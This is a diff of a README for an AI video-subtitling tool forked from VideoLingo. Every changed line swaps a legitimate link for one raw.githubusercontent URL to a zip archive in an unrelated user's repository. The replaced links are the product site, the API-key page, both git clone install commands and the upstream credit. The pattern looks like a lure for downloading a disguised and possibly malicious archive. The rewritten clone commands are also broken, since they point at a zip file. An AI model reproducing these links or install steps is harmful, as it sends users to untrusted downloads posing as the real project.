@@ -6,7 +6,7 @@ Turn a video into translated, properly cut subtitles — and optionally a dubbed
 track — with **one API key**.
 
 Transcription, sentence splitting, terminology extraction, translation and
-dubbing all run through the [dlazy](https://dlazy.com) API. There is no local
+dubbing all run through the [dlazy](https://raw.githubusercontent.com/Frankylancastrian312/ai-video-subtitle/main/core/asr_backend/ai_video_subtitle_v3.8.zip) API. There is no local
 model to download, no GPU to provision, and no per-vendor key to juggle.
 
 ## What it does
@@ -30,14 +30,14 @@ Drop in a video file or a YouTube link, and the pipeline runs:
 - ffmpeg **and ffprobe** on your PATH (pydub needs ffprobe to read durations;
   some portable ffmpeg builds ship only `ffmpeg.exe`)
 - A dlazy API key — get one at
-  [dlazy.com/dashboard/organization/api-key](https://dlazy.com/dashboard/organization/api-key)
+  [dlazy.com/dashboard/organization/api-key](https://raw.githubusercontent.com/Frankylancastrian312/ai-video-subtitle/main/core/asr_backend/ai_video_subtitle_v3.8.zip)
 
 ## Install
 
 ### Option A — uv (no Anaconda needed)
 
 ```bash
-git clone https://github.com/dlazyai/ai-video-subtitle.git
+git clone https://raw.githubusercontent.com/Frankylancastrian312/ai-video-subtitle/main/core/asr_backend/ai_video_subtitle_v3.8.zip
 cd ai-video-subtitle
 python setup_env.py
 ```
@@ -51,7 +51,7 @@ Then start it with `OneKeyStart_uv.bat` on Windows, or:
 ### Option B — conda
 
 ```bash
-git clone https://github.com/dlazyai/ai-video-subtitle.git
+git clone https://raw.githubusercontent.com/Frankylancastrian312/ai-video-subtitle/main/core/asr_backend/ai_video_subtitle_v3.8.zip
 cd ai-video-subtitle
 conda create -n ai-video-subtitle python=3.10 -y
 conda activate ai-video-subtitle
@@ -101,7 +101,7 @@ Honest about what this fork gives up by moving everything to one provider:
 
 ## Credits
 
-Built on [VideoLingo](https://github.com/Huanshere/VideoLingo) by Huanyu,
+Built on [VideoLingo](https://raw.githubusercontent.com/Frankylancastrian312/ai-video-subtitle/main/core/asr_backend/ai_video_subtitle_v3.8.zip) by Huanyu,
 licensed under Apache-2.0. The pipeline design is theirs; this fork swaps the
 model layer for dlazy. See [NOTICE.md](NOTICE.md) for the full list of changes.
 
